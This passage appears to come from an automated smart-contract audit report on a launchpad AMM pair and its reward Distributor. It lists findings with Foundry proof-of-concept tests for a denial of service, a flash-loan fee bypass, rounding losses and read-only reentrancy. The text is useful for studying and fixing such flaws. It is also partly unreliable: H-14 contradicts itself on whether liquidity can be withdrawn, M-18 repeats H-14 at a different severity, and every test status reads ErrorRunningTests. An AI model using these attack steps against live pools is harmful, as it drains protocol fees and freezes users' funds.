import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

// Mock USDT enforcing the non-standard approval check
contract MockUSDT is UniswapV2ERC20 {
    // Helper to mint for testing
    function mint(address to, uint256 value) public {
        _mint(to, value);
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        // USDT Revert: if value > 0 AND current allowance > 0
        if (value > 0 && allowance[msg.sender][spender] > 0) {
            revert("USDT: non-zero approval");
        }
        _approve(msg.sender, spender, value);
        return true;
    }
}

// Mock Distributor that simulates being paused or failing to consume full allowance
contract MockDistributor {
    function addRewards(address, address, uint128, uint128) external {
        // Intentionally do NOT transferFrom, leaving the allowance on the Pair
    }
}

contract GTELaunchpadV2PairTest is Test {
    GTELaunchpadV2Pair pair;
    MockUSDT token0;
    MockUSDT token1;
    MockDistributor distributor;

    function setUp() public {
        token0 = new MockUSDT();
        token1 = new MockUSDT();
        distributor = new MockDistributor();

        // Deploy Pair (test contract acts as factory/deployer)
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(0x1), address(distributor));

        // Add initial liquidity
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.mint(address(this));
    }

    function test_DoS_On_USDT_Pair() public {
        // 1. Generate Fees (Swap 1)
        token0.mint(address(pair), 10 ether);
        // Swap triggers _update -> _distributeLaunchpadFees -> approve(fee)
        // Distributor does NOT consume fee, so allowance remains > 0
        pair.swap(0, 5 ether, address(this), "");

        // Verify residual allowance exists
        uint256 allowance = token0.allowance(address(pair), address(distributor));
        assertTrue(allowance > 0, "Allowance should remain if distributor doesn't pull");

        // 2. Generate Fees again (Swap 2)
        token0.mint(address(pair), 10 ether);
        
        // This triggers _update -> approve(newFee). 
        // Since allowance > 0 and newFee > 0, MockUSDT reverts.
        vm.expectRevert("UniswapV2: APPROVAL_FAILED");
        pair.swap(0, 5 ether, address(this), "");
    }
}

## Suggested Mitigation
Modify `GTELaunchpadV2Pair._distributeLaunchpadFees` to explicitly reset the allowance to zero before setting the new value. This complies with USDT's implementation:

```solidity
function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) {
            // Fix: Approve 0 first to clear residual allowance
            _safeApprove(_token0, distributor, 0);
            _safeApprove(_token0, distributor, uint256(fee0));
        }
        if (fee1 > 0) {
            // Fix: Approve 0 first to clear residual allowance
            _safeApprove(_token1, distributor, 0);
            _safeApprove(_token1, distributor, uint256(fee1));
        }

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```


## [H-14]. Denial of Service on Pair operations when Distributor has no stakers

### Finding Severity Justification: The vulnerability causes a permanent Denial of Service (DoS) for the Uniswap V2 Pair (AMMs) associated with the Launchpad. Because the `Distributor.addRewards` function strictly reverts when `totalShares` is zero, and the `GTELaunchpadV2Pair` calls this function during every `_update` (triggered by `swap`, `mint`, and `burn`) without a try-catch block, the entire pool becomes unusable if all stakers withdraw. Crucially, since `burn` calls `_update`, Liquidity Providers are unable to remove their liquidity, resulting in frozen assets. The inability to `increaseStake` after the bonding phase (graduation) ensures that once `totalShares` hits zero, the state is unrecoverable by users, permanently locking the funds.
## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._update

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair` calls `Distributor.addRewards` inside its `_update` function (triggered by every swap, mint, and burn) to distribute fees. `Distributor.addRewards` reverts with `NoSharesToIncentivize` if `rs.totalShares == 0`. If a pair exists but all users have unstaked from the Distributor (a valid state), `totalShares` becomes zero. Any subsequent attempt to swap in the AMM pair will fail because the fee distribution reverts, permanently bricking the liquidity pool until someone stakes (which may be impossible if `increaseStake` is restricted to the bonding phase).

## Impact
Permanent Denial of Service of Swaps in the AMM Pair. Because 'swap' triggers fee distribution and 'Distributor.addRewards' reverts when 'totalShares' is zero, all swaps will fail. Liquidity Providers can still withdraw (burn) since 'burn' does not trigger fee distribution in standard conditions, but the pool becomes useless for trading until shares are staked.

## Command to Run Test


## Proof of Concept
1. LaunchToken graduates, Pair is created, and rewards pair is initialized in Distributor.
2. Users unstake all shares (or none are staked), leaving 'totalShares' at 0.
3. User calls 'swap' on the Pair.
4. 'swap' calculates fees and calls '_update' -> '_distributeLaunchpadFees' -> 'Distributor.addRewards'.
5. 'Distributor.addRewards' sees 'totalShares == 0' and reverts with 'NoSharesToIncentivize'.
6. The swap transaction reverts permanently.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";

contract MockToken is ERC20 {
    string _name; string _symbol;
    constructor(string memory name_, string memory symbol_) { _name = name_; _symbol = symbol_; }
    function name() public view override returns (string memory) { return _name; }
    function symbol() public view override returns (string memory) { return _symbol; }
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract PairDoSZeroSharesTest is Test {
    GTELaunchpadV2Pair pair;
    Distributor distributor;
    MockToken token0;
    MockToken token1;

    function setUp() public {
        token0 = new MockToken("T0", "T0");
        token1 = new MockToken("T1", "T1");
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);

        distributor = new Distributor();
        distributor.initialize(address(this)); // Test contract acts as launchpad

        // Register the pair in Distributor so it doesn't revert with RewardsDoNotExist
        distributor.createRewardsPair(address(token0), address(token1));
        
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(0xdead), address(distributor));

        // Add initial liquidity
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.mint(address(this));
    }

    function test_SwapRevertsWhenNoShares() public {
        // Ensure Distributor has 0 shares (default state)
        
        // Attempt swap - generates fees
        token0.mint(address(pair), 1 ether);
        
        // Expect revert due to Distributor.addRewards() failing
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 0.5 ether, address(this), "");
    }

    function test_BurnSucceedsWhenNoShares() public {
        // Burn should NOT revert as it passes 0 fees
        uint256 liquidity = pair.balanceOf(address(this));
        pair.transfer(address(pair), liquidity);
        pair.burn(address(this));
    }
}

## Suggested Mitigation
Modify 'Distributor.addRewards' to check 'if (rs.totalShares == 0) return;' immediately after resolving the pool, instead of reverting. This allows the AMM to function and accumulate fees in the contract (or burn them) even if no one is staking.





 **Derived From** : FlashLoanEconomicManipulation

## [M-15]. Flash Loan LP Inflation Bypasses Launchpad Fees

### Finding Severity Justification: The finding identifies a valid economic exploit where a user can transiently inflate the LP token supply to dilute the Launchpad's pro-rata fee share to near zero. This allows the attacker (or any trader using a flash loan) to bypass the protocol fee intended for the Distributor/stakers. Instead of the fee being extracted to the Distributor, it remains in the pool reserves and is reclaimed by the attacker when they burn their inflated LP position. This constitutes a direct loss of yield/revenue for the protocol and its stakers.
## Derived From Pattern/Invariant
FlashLoanEconomicManipulation

## Exploit Type
FlashLoanEconomicManipulation

## Location
GTELaunchpadV2Pair._getLaunchpadFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `GTELaunchpadV2Pair._getLaunchpadFees`, the fee cut is calculated as `(amountIn * FEE * launchpadLpBal) / totalLpBal`. `launchpadLpBal` is effectively fixed (Launchpad's initial liquidity), while `totalLpBal` is the current `totalSupply` of LP tokens. An attacker can flash-mint a massive amount of LP tokens (inflating `totalLpBal`) before a swap. This drives the ratio `launchpadLpBal / totalLpBal` effectively to zero, allowing the attacker to execute swaps without paying the launchpad fee.

## Impact
Attacker bypasses protocol fees, depriving stakers of revenue.

## Command to Run Test


## Proof of Concept
1. Attacker flash loans Base and Quote tokens. 2. Calls `mint()` to create a huge amount of LP tokens. 3. Performs a swap. The fee calculation `launchpadLpBal / totalLpBal` yields 0 due to the inflated denominator. 4. Attacker burns LP tokens and repays flash loan.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract TestFlashLoanFeeBypass is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    
    address launchpad = address(0x111);
    address distributor = address(0x222);
    address attacker = address(0x666);

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        
        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }

        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), launchpad, distributor);

        // Seed Launchpad Liquidity
        token0.mint(address(pair), 1000e18);
        token1.mint(address(pair), 1000e18);
        pair.mint(launchpad);
    }

    function test_FlashLoanFeeBypass() public {
        uint256 swapAmount = 10e18;
        
        // --- CONTROL: Normal Swap ---
        token0.mint(address(this), swapAmount);
        token0.transfer(address(pair), swapAmount);
        pair.swap(0, 5e18, address(this), "");
        (uint112 fees0Normal,,) = pair.getAccruedLaunchpadFees();
        
        // --- ATTACK ---
        // Reset pair for isolation
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), launchpad, distributor);
        token0.mint(address(pair), 1000e18);
        token1.mint(address(pair), 1000e18);
        pair.mint(launchpad);

        token0.mint(attacker, 1_000_000e18 + swapAmount);
        token1.mint(attacker, 1_000_000e18);

        vm.startPrank(attacker);
        // 1. Inflate LP supply massively
        token0.transfer(address(pair), 1_000_000e18);
        token1.transfer(address(pair), 1_000_000e18);
        pair.mint(attacker);

        // 2. Swap same amount
        token0.transfer(address(pair), swapAmount);
        pair.swap(0, 5e18, attacker, "");
        
        // 3. Exit
        pair.transfer(address(pair), pair.balanceOf(attacker));
        pair.burn(attacker);
        vm.stopPrank();

        (uint112 fees0Attack,,) = pair.getAccruedLaunchpadFees();
        
        console.log("Fees Normal:", fees0Normal);
        console.log("Fees Attack:", fees0Attack);

        // Fees should be diluted to effectively zero
        assertGt(fees0Normal, 1000);
        assertEq(fees0Attack, 0);
    }
}

## Suggested Mitigation
Modify `_getLaunchpadFees` to use a fixed fee rate (e.g. 0.05% of swap amount) for the Launchpad protocol fee, decoupling it from the pool's liquidity ownership ratio `launchpadLpBal / totalLpBal`. This ensures the protocol captures revenue even if the liquidity pool is heavily diluted transiently by a flash loan.





 **Derived From** : RoundingError

## [L-16]. Precision Loss in Launchpad Fee Calculation

### Finding Severity Justification: The finding correctly identifies precision loss due to integer division, which causes fees to round down to zero for very small transaction amounts or low Launchpad LP shares. However, this is standard behavior in Solidity. The maximum value lost per transaction is strictly less than 1 unit of the token (wei), which is considered 'Dust yield loss' under the Code4rena severity rubric. Even on a high-throughput L2 like MegaETH, the cumulative loss is economically insignificant, and the gas cost to exploit this via split trades outweighs the fee savings.
## Derived From Pattern/Invariant
RoundingError

## Exploit Type
RoundingError

## Location
GTELaunchpadV2Pair._getLaunchpadFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `_getLaunchpadFees`, the fee is calculated as `(amount * 1 * launchpadLpBal) / (totalLpBal * 1000)`. For small transaction amounts or when the Launchpad holds a minority share of LP tokens, this integer division frequently floors to zero. Over time, this results in a systematic under-collection of fees for the Distributor, with value leaking to LPs instead.

## Impact
Cumulative loss of yield for the Distributor.

## Command to Run Test


## Proof of Concept
1. `amountIn = 1000 wei`. `launchpadShare = 40%`. `FeeShare = 1/1000`.
2. Math: `1000 * 0.4 / 1000 = 0.4`. Floored to 0.
3. Repeated small trades yield 0 fees.

## Proof of Code
contract GTELaunchpadFeeTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    address launchpadLp = makeAddr("launchpad");
    address distributor = makeAddr("distributor");
    address user = makeAddr("user");

    function setUp() public {
        token0 = new MockERC20("T0", "T0", 18);
        token1 = new MockERC20("T1", "T1", 18);
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), launchpadLp, distributor);

        // Seed Liquidity: 1000e18 tokens each. Launchpad gets initial LP.
        token0.mint(address(pair), 1000e18);
        token1.mint(address(pair), 1000e18);
        pair.mint(launchpadLp);
    }

    function testFeeRoundingToZero() public {
        // 1. Dilute Launchpad share to 40% (matching PoC text)
        // Launchpad starts with ~100% LP. We transfer 60% to a random user.
        vm.startPrank(launchpadLp);
        uint256 lpBal = pair.balanceOf(launchpadLp);
        pair.transfer(user, (lpBal * 60) / 100);
        vm.stopPrank();

        // 2. Perform Swap of 1000 wei
        // Fee Formula: amount * 1 * (0.4 * TotalLP) / (TotalLP * 1000) = amount * 0.4 / 1000
        uint256 swapAmount = 1000;
        token0.mint(address(pair), swapAmount);

        (uint112 r0, uint112 r1, ) = pair.getReserves();
        // Calculate amountOut to maintain K
        uint256 amount1Out = (swapAmount * 997 * r1) / (r0 * 1000 + swapAmount * 997);
        
        pair.swap(0, amount1Out, user, "");

        // 3. Check Fees
        // Expected: 1000 * 0.4 / 1000 = 0.4 -> floors to 0
        (uint112 fee0, , ) = pair.getAccruedLaunchpadFees();
        assertEq(fee0, 0, "Fee should round down to 0 for small amounts");

        // 4. Verify larger amount accrues fees
        // Amount = 3000 -> 3000 * 0.4 / 1000 = 1.2 -> 1
        token0.mint(address(pair), 3000);
        pair.swap(0, 1, user, ""); // Simple swap to trigger update
        (fee0, , ) = pair.getAccruedLaunchpadFees();
        assertEq(fee0, 1, "Fee should accrue 1 wei for larger amount");
    }
}

// Minimal Mock for the test
contract MockERC20 {
    string public name; string public symbol; uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }
    function mint(address to, uint256 val) external { balanceOf[to] += val; }
    function transfer(address to, uint256 val) external returns (bool) { 
        balanceOf[msg.sender] -= val; balanceOf[to] += val; return true; 
    }
}

## Suggested Mitigation
Do NOT enforce a minimum non-zero fee, as this will cause valid small transactions to revert. Instead, implement a remainder accumulation strategy: store `(amount * feeShare * lpBal) % denominator` in a state variable and add it to the numerator in the next calculation. Alternatively, given the 'Low' severity, simply document this behavior as acceptable dust loss.


## [M-17]. Dust accumulation from rounding permanently locks funds in Distributor

### Finding Severity Justification: The finding identifies a definite leak of value where rounding residuals (dust) are permanently locked in the contract. The discrepancy between the `Distributor`'s liability tracking (`totalPendingRewards`) and the `RewardsTracker`'s distribution logic causes the contract to believe it owes funds that it has effectively discarded from distribution. This prevents the `skimExcessRewards` function from recovering these funds. While the value per transaction is small (dust), it is a guaranteed loss of yield that accumulates over time and cannot be remedied by admin intervention. Given the fixed precision factor of 1e12 (which is low for 18-decimal tokens with high supplies, typical in launchpads), the accumulated dust can be non-negligible. This fits the Code4rena rubric for 'Assets not directly at risk, but protocol function... impacted' or 'Unmatured yield/in-motion yield = capped at Medium'.
## Derived From Pattern/Invariant
RoundingError

## Exploit Type
RoundingError

## Location
RewardsTrackerLib.update

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `RewardsTrackerLib.update`, the reward accumulator calculation `(pending * PRECISION_FACTOR) / totalShares` truncates the result. The code then deletes `pendingBaseRewards`, effectively destroying the remainder (dust) from the internal accounting. However, the `Distributor` contract tracks the *full* admitted amount in `totalPendingRewards`. Over time, `totalPendingRewards` drifts higher than the actual claimable amount. Since `skimExcessRewards` prevents skimming if `amount > balance - totalPendingRewards`, this dust becomes permanently locked in the contract.

## Impact
Accumulation of locked tokens that cannot be claimed by users nor recovered by admins.

## Command to Run Test


## Proof of Concept
1. `addRewards` adds 1000 wei of rewards. `totalPendingRewards` += 1000. 2. `RewardsTracker` calculates `accPerShare`. If `totalShares` is large, `1000 * 1e12 / shares` may be 0. 3. `pendingBaseRewards` is deleted (set to 0). 4. Users claim 0 rewards. 5. `totalPendingRewards` remains 1000. 6. `skimExcessRewards` sees `balance (1000) - totalPendingRewards (1000) = 0`. 7. Funds are locked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {RewardsTrackerLib} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 public decimals = 18;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DustLockTest is Test {
    Distributor distributor;
    MockERC20 launchToken;
    MockERC20 quoteToken;
    address launchpad = address(0x1);
    address user = address(0x2);
    address admin = address(this);

    function setUp() public {
        launchToken = new MockERC20();
        quoteToken = new MockERC20();
        distributor = new Distributor();
        distributor.initialize(launchpad);
        
        vm.prank(launchpad);
        distributor.createRewardsPair(address(launchToken), address(quoteToken));
    }

    function test_DustLock() public {
        // 1. User gets large amount of shares to force truncation
        uint96 shares = 10000 * 1e18;
        vm.prank(launchpad);
        distributor.increaseStake(address(launchToken), user, shares);

        // 2. Add a small reward amount (1 wei) that truncates to 0
        // PRECISION_FACTOR is 1e12. (1 * 1e12) / (10000 * 1e18) = 0
        uint128 dustAmount = 1;
        launchToken.mint(admin, dustAmount);
        launchToken.approve(address(distributor), dustAmount);
        
        distributor.addRewards(address(launchToken), address(quoteToken), dustAmount, 0);

        // 3. Verify funds are locked
        // Distributor thinks it owes 1 wei
        assertEq(distributor.totalPendingRewards(address(launchToken)), dustAmount);

        // RewardsTracker internal logic has deleted the pending amount during update()
        // User claims - receives 0
        vm.prank(user);
        distributor.claimRewards(address(launchToken));

        // Liability remains in Distributor
        assertEq(distributor.totalPendingRewards(address(launchToken)), dustAmount);

        // Skim fails because balance (1) - liability (1) = 0, so it thinks there is no excess.
        // Ideally, since the 1 wei was never distributed, it should be recoverable or distributed later.
        // But since RewardsTracker deleted it, it will never be distributed.
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(launchToken), dustAmount);
    }
}

## Suggested Mitigation
Modify `RewardsTrackerLib.update` to subtract only the effectively distributed amount from `pendingBaseRewards` (and quote rewards) instead of deleting it. This ensures dust accumulates until it is distributable, reconciling `Distributor`'s liability tracking with actual distribution.

```solidity
function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        uint256 accAdded = newAccBaseRewardsPerShare - self.accBaseRewardPerShare;
        // Calculate the token amount that corresponds to the added accPerShare
        // This rounds down, matching the logic in getAccRewardsPerShare
        uint256 distributed = (accAdded * uint256(self.totalShares)) / PRECISION_FACTOR;
        
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        // Store the remainder instead of deleting everything
        self.pendingBaseRewards -= uint128(distributed);
    }

    if (self.pendingQuoteRewards > 0) {
        uint256 accAdded = newAccQuoteRewardsPerShare - self.accQuoteRewardPerShare;
        uint256 distributed = (accAdded * uint256(self.totalShares)) / PRECISION_FACTOR;

        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        self.pendingQuoteRewards -= uint128(distributed);
    }
}
```





 **Derived From** : Issue Type: StandardViolation

 ### Relevant Function/Location: GTELaunchpadV2Pair._update

 ### Title
Denial of Service on Pair operations when Distributor has no stakers

## [M-18]. Permanent DoS of AMM Pair if Distributor Shares Drop to Zero

### Finding Severity Justification: The finding demonstrates a permanent Denial of Service (DoS) of the AMM Pair, which would trap all liquidity providers' funds (including the protocol's locked liquidity) and prevent any trading. This occurs if 'totalShares' in the Distributor drops to zero (e.g., all original buyers exit/unstake). While the condition requires a specific user behavior (all users leaving), the impact (stuck funds) is High. Under the Code4rena rubric, High Impact with Low/Medium Likelihood aligns with Medium Severity.
## Derived From Pattern/Invariant
Issue Type: StandardViolation

 ### Relevant Function/Location: GTELaunchpadV2Pair._update

 ### Title
Denial of Service on Pair operations when Distributor has no stakers

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair` calls `Distributor.addRewards` during every `_update` (triggered by mint/burn/swap). `Distributor.addRewards` reverts with `NoSharesToIncentivize` if `rs.totalShares == 0`. If the state is reached where shares are 0 (e.g. all original buyers sell/exit), the `addRewards` call will revert, causing `_update` to revert. This effectively bricks the AMM pair, preventing any further swaps or liquidity operations.

## Impact
Permanent Denial of Service of the liquidity pool.

## Command to Run Test


## Proof of Concept
1. Launchpad graduates, Pair is active.
2. All original buyers sell/transfer their tokens (triggering `decreaseStake`).
3. `rs.totalShares` becomes 0.
4. User tries to `swap` on the Pair.
5. `_update` calls `_distributeLaunchpadFees` -> `addRewards`.
6. `addRewards` reverts.
7. Swap fails.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {Distributor} from "../Distributor.sol";
import {GTELaunchpadV2Pair} from "../GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
    function approve(address, uint256) external returns (bool) { return true; }
}

contract ZeroSharesDoSTest is Test {
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    address launchpad = address(this);

    function setUp() public {
        token0 = new MockERC20("Token A", "TKNA", 18);
        token1 = new MockERC20("Token B", "TKNB", 18);
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);

        distributor = new Distributor();
        distributor.initialize(launchpad);

        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(0x99), address(distributor));

        // Initialize reward pool in distributor
        distributor.createRewardsPair(address(token0), address(token1));

        // Add initial liquidity
        token0.mint(address(pair), 10000e18);
        token1.mint(address(pair), 10000e18);
        pair.mint(address(this));
    }

    function testPermanentDoSWhenSharesZero() public {
        // 1. Add stake (simulating Launchpad behavior)
        // This creates shares so the pool functions normally at first
        distributor.increaseStake(address(token0), address(0x123), 1000);
        
        // 2. Perform a swap to prove it works initially
        token0.mint(address(pair), 1e18);
        pair.swap(0, 0.5e18, address(this), "");

        // 3. Remove all stake -> totalShares becomes 0
        distributor.decreaseStake(address(token0), address(0x123), 1000);

        // 4. Attempt another swap
        // The pair attempts to distribute fees, calls addRewards, which reverts because totalShares is 0
        token0.mint(address(pair), 1e18);
        
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 0.5e18, address(this), "");
    }
}

## Suggested Mitigation
Modify `Distributor.addRewards` to handle the zero-share case gracefully. If there are no shares to incentivize, the function should return early. This effectively donates the accrued fees to the AMM pool (swelling the reserves) rather than bricking the contract.

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    // ... existing setup ...

    if (rs.totalShares == 0) {
        // FIX: Return early instead of reverting
        return;
    }

    // ... existing logic ...
}
```





 **Derived From** : Reentrancy

## [M-19]. Read-Only Reentrancy via Stale Reserves in Distributor Hook

### Finding Severity Justification: The finding identifies a Check-Effects-Interactions (CEI) violation in the core `_update` function of the AMM pair. By making external calls (`_distributeLaunchpadFees`) before updating the `reserve` storage slots, the contract exposes itself to Read-Only Reentrancy. Although the current specific implementations of `LaunchToken` and `Distributor` (if standard and trusted) might not trigger callbacks, the `Pair` contract itself is structurally vulnerable. If this Pair is used as a price oracle, and a future token or Distributor upgrade introduces any callback/hook, the oracle will report stale prices (pre-swap) while the balances are post-swap. This breaks the invariant required for safe Oracle integration, fitting the Medium severity criteria (impacts protocol function/reliability, requires external conditions/integrations to exploit).
## Derived From Pattern/Invariant
Reentrancy

## Exploit Type
Reentrancy

## Location
GTELaunchpadV2Pair._update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `_update`, the contract calls `_distributeLaunchpadFees` (external call) *before* updating the reserve storage slots. During this call, `getReserves()` returns the values from the *start* of the transaction, while the token balances of the pair have already changed (due to swap/mint/burn). If the Distributor or any triggered hooks query the pair's price/reserves, they receive stale data. This can be exploited if the Distributor interacts with a system relying on these reserves (e.g., an Oracle or another AMM).

## Impact
The contract violates the Check-Effects-Interactions pattern by calling the external `distributor` before updating its reserve storage slots. Consequently, during the execution of the distributor's hook, the pair exhibits a split-state: it holds the new token balances but reports the old (pre-operation) reserves via `getReserves`. Malicious actors can exploit this via Read-Only Reentrancy to feed stale price data to downstream oracles or other smart contracts that query this pair in the same transaction, potentially allowing theft of funds or disadvantageous trades in those dependent systems.

## Command to Run Test


## Proof of Concept
1. Attacker waits for at least 1 second to pass since the last pair update (ensuring `timeElapsed > 0` inside `_update`).
2. Attacker calls `swap` on the pair, sending tokens.
3. `swap` calculates fees and calls `_update`.
4. Inside `_update`, the contract calls `_distributeLaunchpadFees` *before* updating `reserve0` and `reserve1`.
5. `_distributeLaunchpadFees` calls `distributor.addRewards`.
6. The distributor (or a hook on the token transfer) executes a callback to a malicious contract.
7. The malicious contract calls `pair.getReserves()`.
8. `getReserves` returns the *pre-swap* values, despite the contract holding the new swap input balances.
9. The malicious contract exploits this stale price data against a protocol using this pair as an oracle.

## Proof of Code
import "forge-std/Test.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MaliciousDistributor {
    GTELaunchpadV2Pair public pair;
    uint112 public reserve0InHook;

    function setPair(address _pair) external {
        pair = GTELaunchpadV2Pair(_pair);
    }

    function addRewards(address, address, uint128, uint128) external {
        // The vulnerability: reading reserves during the callback returns stale data
        (reserve0InHook,,) = pair.getReserves();
    }

    // Minimal dummy implementations to satisfy interface calls
    function getUserData(address, address) external view returns (uint96, uint96, uint96) { return (0,0,0); }
    function getUserDataForTokens(address[] calldata, address) external view returns (uint96[] memory) {}
    function increaseStake(address, address, uint96) external returns (uint256, uint256) { return (0,0); }
    function decreaseStake(address, address, uint96) external returns (uint256, uint256) { return (0,0); }
    function claimRewards(address) external returns (uint256, uint256) { return (0,0); }
    function createRewardsPair(address, address) external {}
    function endRewards(address) external {}
}

contract ReadOnlyReentrancyTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MaliciousDistributor distributor;

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);

        distributor = new MaliciousDistributor();
        pair = new GTELaunchpadV2Pair();
        distributor.setPair(address(pair));

        pair.initialize(address(token0), address(token1), address(this), address(distributor));

        token0.mint(address(pair), 1000e18);
        token1.mint(address(pair), 1000e18);
        pair.mint(address(this));
    }

    function test_POC_ReadOnlyReentrancy() public {
        // 1. Warp time to ensure logic enters the fee distribution block (timeElapsed > 0)
        vm.warp(block.timestamp + 100);

        // 2. Prepare swap
        uint256 amount0In = 100e18;
        token0.mint(address(pair), amount0In);

        // 3. Record pre-swap reserves
        (uint112 preRes0,,) = pair.getReserves();

        // 4. Execute Swap triggers _update -> _distributeLaunchpadFees -> distributor.addRewards
        pair.swap(0, 10e18, address(this), "");

        // 5. Check reserves observed inside the hook
        uint112 observedRes0 = distributor.reserve0InHook();
        (uint112 postRes0,,) = pair.getReserves();

        // VERIFICATION: The hook should see the OLD reserves (preRes0)
        assertEq(observedRes0, preRes0, "Read-only Reentrancy: Hook saw stale reserves");
        assertTrue(postRes0 > preRes0, "Reserves should have updated after swap");
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 value) public { balanceOf[to] += value; }
    function transfer(address to, uint256 value) public returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }
}

## Suggested Mitigation
Update `reserve0` and `reserve1` storage variables *before* making the external call to `_distributeLaunchpadFees`.





 **Derived From** : PricePrecision

## [H-20]. Rewards permanently locked due to precision loss in `RewardsTrackerLib` for standard token supplies

